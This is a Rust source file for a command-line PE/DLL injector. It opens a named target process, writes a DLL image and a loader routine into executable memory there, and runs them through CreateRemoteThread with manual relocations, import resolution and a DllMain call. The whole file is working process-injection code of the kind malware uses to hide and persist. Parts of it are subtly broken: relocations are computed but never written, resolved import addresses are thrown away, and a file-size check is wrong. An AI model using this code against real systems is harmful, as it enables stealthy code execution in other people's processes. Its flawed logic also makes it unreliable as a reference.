use std::{io, ptr::null_mut, ffi::{CString, c_void}, intrinsics::transmute};

use sysinfo::{Pid, SystemExt, ProcessExt};
use winapi::{um::{errhandlingapi::GetLastError, winnt::{GENERIC_READ, FILE_ATTRIBUTE_NORMAL, PAGE_READWRITE, MEM_COMMIT, MEM_RESERVE, PIMAGE_NT_HEADERS64, PIMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE, PROCESS_ALL_ACCESS, PAGE_EXECUTE_READWRITE, PIMAGE_SECTION_HEADER, PIMAGE_BASE_RELOCATION, PIMAGE_IMPORT_DESCRIPTOR, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, MEM_RELEASE, DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, PIMAGE_THUNK_DATA64, PIMAGE_IMPORT_BY_NAME}, fileapi::{CreateFileA, OPEN_EXISTING, GetFileSize, INVALID_FILE_SIZE, ReadFile}, memoryapi::{VirtualAlloc, VirtualAllocEx, WriteProcessMemory, VirtualFreeEx}, processthreadsapi::{OpenProcess, CreateRemoteThread}, handleapi::CloseHandle, libloaderapi::{LoadLibraryA, GetProcAddress}, synchapi::WaitForSingleObject}, shared::{minwindef::{FALSE, DWORD, LPVOID, HINSTANCE}}};
use clap::Parser;

//#[allow(non_camel_case_types)]
//type fnLoadLibraryA = unsafe extern "system" fn(lpFileName: LPCSTR) -> HMODULE;

//#[allow(non_camel_case_types)]
//type fnGetProcAddress = unsafe extern "system" fn(hModule: HMODULE, lpProcName: LPCSTR) -> FARPROC;


/// Portable executable injector (PE injector)
#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    /// Target process to inject PE
    #[clap(short, long)]
    process: String,

    /// Path to the dll to inject
    #[clap(short, long)]
    dll: String,
}

mod lib;
fn main() {
    //let dll_path = CString::new("C:\\Tools\\ReflectiveDLLInjection-master\\x64\\Release\\reflective_dll.x64.dll").unwrap().into_raw();
    //let process_id = get_process_id_by_name("notepad.exe");
    let args = Args::parse();

    let dll_path = CString::new(args.dll).unwrap().into_raw();
    let process_id = get_process_id_by_name(args.process.as_str());

    println!("TARGET PROCESS ID: {:?}", process_id);

    // Get a handle to the dll
    let file_handle = unsafe { 
        CreateFileA(
            dll_path,
            GENERIC_READ,
            0,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut())
    };

    // Get the dll file size
    let file_size = unsafe { GetFileSize(file_handle, null_mut()) };

    if file_size == INVALID_FILE_SIZE && file_size == 0 {
        error("[-] Failed to get the DLL file size")
    }

    /* 
    // Allocate memory on the heap in the current process (or just use VirtualAlloc)
    let dll_bytes = unsafe { 
        HeapAlloc(
            GetProcessHeap(),
            0,
            file_size as usize
        )
    }; 
    
    if dll_bytes.is_null() {
        error("[-] Failed to allocate a buffer")
    }*/

    // Allocate memory in the current process for the PE image
    let file_buffer = unsafe { 
        VirtualAlloc(
            null_mut(),
            file_size as usize,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        )
    };

    if file_buffer == null_mut() {
        error("Failed to allocate memory for the file");
    }
    
    //Read data from the file (stored in 2nd parameter dll_bytes)
    let read_result = unsafe { 
        ReadFile(
            file_handle,
            file_buffer,
            file_size,
            null_mut(),
            null_mut()
        )
    };

    if read_result == 0 {
        error("[-] Failed to read data from file");
    }

    let (dos_header, nt_headers) = get_image_nt_and_dos_headers(file_buffer);
    println!("[+] IMAGE_DOS_HEADER {:p} and IMAGE_NT_HEADERS: {:p}", dos_header, nt_headers);

    // Open the target process to inject PE image
    let process_handle = unsafe { 
        OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            process_id as u32
        )
    };

    if process_handle == null_mut() {
        error("Failed to open the target process");
    }

    println!("[+] Process Handle: {:?}", process_handle);

    // Allocate memory in the target process to inject the dll
    let executable_image = unsafe { 
        VirtualAllocEx(
            process_handle,
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };

    if executable_image == null_mut() {
        error("Failed to allocate memory in the target process for PE file");
    }
    
    println!("[+] Remote Executable Image Allocated Memory: {:p}", executable_image);

    // Copy the image headers into the target process
    let wpm_result = unsafe { 
        WriteProcessMemory(
            process_handle,
            executable_image,
            file_buffer,
            (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
            null_mut()
        )
    };
    
    if wpm_result == 0 {
        error("Failed to write source image to destination image");
    }

    // Copy sections of the dll to the target process
    let section_header = unsafe { 
        transmute::<usize, PIMAGE_SECTION_HEADER>(&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
    };

    println!("[+] IMAGE_SECTION_HEADER: {:p}", section_header);

    for i in unsafe { 0..(*nt_headers).FileHeader.NumberOfSections } {
        let section_header_i = unsafe { &*(section_header.add(i as usize)) };
        
        let destination = executable_image as usize + section_header_i.VirtualAddress as usize;
        let source = file_buffer as usize + section_header_i.PointerToRawData as usize;
        let size = section_header_i.SizeOfRawData as usize;
        //println!("Desination: {:#x}", destination);
        //println!("Source: {:#x}", source);

        // Copy section headers into the target process
        let wpm_result = unsafe { 
            WriteProcessMemory(
                process_handle,
                destination as *mut _,
                source as *mut _,
                size,
                null_mut()
            )
        };

        if wpm_result == 0 {
            error("Failed to write sections to the target process");
        }
    }

    // Allocate memory for the loader code
    let loader_memory = unsafe { 
        VirtualAllocEx(
            process_handle,
            null_mut(),
            4096,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };

    if loader_memory == null_mut() {
        error("Failed to allocate memory in the target process for the loader code");
    }

    println!("[+] Loader Code Allocated Memory: {:p}", loader_memory);

    /*
    // LOADER STUFF (Initialize)
    let loader = Loader {
        image_base: executable_image,
        nt_header: {
            unsafe {
                transmute::<usize, PIMAGE_NT_HEADERS64>(
                    executable_image as usize + (*dos_header).e_lfanew as usize,
                )
            }
        },
        base_relocation: {
            unsafe {
                transmute::<usize, PIMAGE_BASE_RELOCATION>(
                    executable_image as usize
                        + (*nt_headers).OptionalHeader.DataDirectory
                            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
                            .VirtualAddress as usize,
                )
            }
        },
        import_directory: {
            unsafe { 
                transmute::<usize, PIMAGE_IMPORT_DESCRIPTOR>(
                    executable_image as usize 
                        + (*nt_headers).OptionalHeader.DataDirectory
                            [IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
                            .VirtualAddress as usize
                )
            }
        },
        //pLoadLibraryA: LoadLibraryA,
        //pGetProcAddress: GetProcAddress,
    };


    // Write the loader information to the target process
    let wpm_result = unsafe { 
        WriteProcessMemory(
            process_handle,
            loader_memory,
            &loader as *const _ as *const c_void,
            size_of::<Loader>(),
            null_mut()
        )
    };

    if wpm_result == 0 {
        error("Failed to write loader information to the target process");
    }*/


    // Write the loader code to target process
    let wpm_result = unsafe { 
        WriteProcessMemory(
            process_handle,
            loader_memory,
            library_loader as *mut c_void,
            0x1000,
            null_mut()
        )
    };

    if wpm_result == 0 {
        error("Failed to write loader code to the target process");
    }
    
    // Create an LPTHREAD_START_ROUTINE for CreateRemoteThread
    type ThreadStartRoutine = unsafe extern "system" fn(LPVOID) -> DWORD;
    let start_routine = unsafe { Some(transmute::<_, ThreadStartRoutine>(loader_memory)) };

    // Create a thread in the target process to start the injected PE image
    let thread_handle = unsafe { 
        CreateRemoteThread(
            process_handle,
            null_mut(),
            0,
            start_routine,
            executable_image,   //&loader as *const _ as *mut c_void
            0,
            null_mut()
        )
    };

    if thread_handle == null_mut() {
        error("Failed to create remote thread");
    }

    //println!("Loaded and Size: {:?} {}", loader, size_of::<Loader>());
    //println!("{:p} {:p} {:p} {:p}", loader.image_base, loader.nt_header, loader.base_relocation, loader.import_directory);

    unsafe { WaitForSingleObject(thread_handle, 0xFFFFFFFF) };

 
    unsafe { 
        CloseHandle(process_handle);
        VirtualFreeEx(process_handle, loader_memory, 0, MEM_RELEASE);
    }
}

#[allow(unused_assignments)]
//#[allow(unused_variables)]
#[allow(non_snake_case)]
pub unsafe fn library_loader(executable_image: *mut c_void) 
{
    //let executable_image = loader.image_base;

    //loader code goes here
    let dos_header = transmute::<_, PIMAGE_DOS_HEADER>(executable_image);
    let nt_headers = transmute::<_, PIMAGE_NT_HEADERS64>(dos_header as usize + (*dos_header).e_lfanew as usize);
    
    let mut current_base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(executable_image as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize);
    let relocation_end = current_base_relocation as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;
    let delta = executable_image as isize - (*nt_headers).OptionalHeader.ImageBase as isize;
    
    while (*current_base_relocation).VirtualAddress != 0u32 && (*current_base_relocation).VirtualAddress as usize <= relocation_end && (*current_base_relocation).SizeOfBlock != 0u32
    {
        
        let address = (executable_image as usize + (*current_base_relocation).VirtualAddress as usize) as isize;
        
        let item = transmute::<usize, *const u16>(current_base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>());

        let count = ((*current_base_relocation).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / std::mem::size_of::<u16>() as usize;

        for i in 0..count 
        {
            let type_field = item.offset(i as isize).read() >> 12;
            let offset = item.offset(i as isize).read() & 0xFFF;

            if type_field == IMAGE_REL_BASED_DIR64 
            {
                let mut relocate_me = *((address + offset as isize) as *mut isize);
                relocate_me = delta + relocate_me;
            }
        }

        current_base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(current_base_relocation as usize + (*current_base_relocation).SizeOfBlock as usize);
    }

    // Resolve imports
    let mut current_import_descriptor = (executable_image as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as PIMAGE_IMPORT_DESCRIPTOR;

    while (*current_import_descriptor).FirstThunk != 0 
    {
        //let name = CStr::from_ptr((executable_image as usize + (*current_import_descriptor).Name as usize) as *const i8).to_str().expect("Couldn't convert to str").to_string();
        let dll_name = (executable_image as usize + (*current_import_descriptor).Name as usize) as *const i8;
        let dll_handle = LoadLibraryA(dll_name);

        //let mut current_first_thunk = (executable_image as usize + (*current_import_descriptor).FirstThunk as usize) as PIMAGE_THUNK_DATA64;
        
        let mut current_original_first_thunk = (executable_image as usize + *(*current_import_descriptor).u.OriginalFirstThunk() as usize) as PIMAGE_THUNK_DATA64;

        while (*(*current_original_first_thunk).u1.Function()) != 0 
        {
            let thunk_data = (executable_image as usize + *(*current_original_first_thunk).u1.AddressOfData() as usize) as PIMAGE_IMPORT_BY_NAME;

            //let function_name = CStr::from_ptr((*thunk_data).Name.as_ptr()).to_str().expect("couldn't convert to str").to_string();
            let function_name = (*thunk_data).Name.as_ptr();
            GetProcAddress(dll_handle, function_name);

            //let function_address = (*current_first_thunk).u1.Function_mut() as *mut u64 as usize;

            current_original_first_thunk = (current_original_first_thunk as usize + std::mem::size_of::<PIMAGE_THUNK_DATA64>()) as PIMAGE_THUNK_DATA64;
            
            //current_first_thunk = (current_first_thunk as usize + std::mem::size_of::<PIMAGE_THUNK_DATA64>()) as PIMAGE_THUNK_DATA64;
        }

        current_import_descriptor = (current_import_descriptor as usize + std::mem::size_of::<PIMAGE_IMPORT_DESCRIPTOR>()) as PIMAGE_IMPORT_DESCRIPTOR;
    }

    // Call DLL main manually
    type EntryPoint = unsafe extern "system" fn(hinst_dll: HINSTANCE, fdw_reason: DWORD, _lpv_reserved: LPVOID);
    let DllMain = transmute::<_, EntryPoint>(executable_image as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize);

    DllMain(executable_image as HINSTANCE, DLL_PROCESS_ATTACH, null_mut());
}

#[allow(dead_code, non_snake_case)]
pub struct Loader {
    image_base: *mut c_void,
    nt_header: PIMAGE_NT_HEADERS64,
    base_relocation: PIMAGE_BASE_RELOCATION,
    import_directory: PIMAGE_IMPORT_DESCRIPTOR,
    //pLoadLibraryA: fnLoadLibraryA,
    //pGetProcAddress: fnGetProcAddress,
}

// Get IMAGE_NT_HEADERS of the image base address
fn get_image_nt_and_dos_headers(image_base: *mut c_void) -> (PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS64) {
    unsafe {
        let dos_header = transmute::<_, PIMAGE_DOS_HEADER>(image_base);

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            panic!("[-] Failed to get IMAGE_DOS_HEADER");
        }
        //println!("[+] IMAGE_DOS_HEADER: {:p}", dos_header);

        let nt_headers = transmute::<usize, PIMAGE_NT_HEADERS64>(
            image_base as usize + (*dos_header).e_lfanew as usize,
        );

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            panic!("[-] Failed to get IMAGE_NT_HEADERS");
        }

        //println!("[+] IMAGE_NT_HEADERS: {:p}", nt_headers);
        
        (dos_header, nt_headers)
    }
}


#[allow(dead_code)]
// Gets user input from the terminal
fn get_input() -> io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
// Used for debugging
fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}

#[allow(dead_code)]
// Panic and print GetLastError
fn error(text: &str){
    panic!("[-] {} {}", text, unsafe { GetLastError()});
}

#[allow(dead_code)]
// Get Process ID
fn get_process_id_by_name(target_process: &str) -> Pid {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }

    return process_id;
}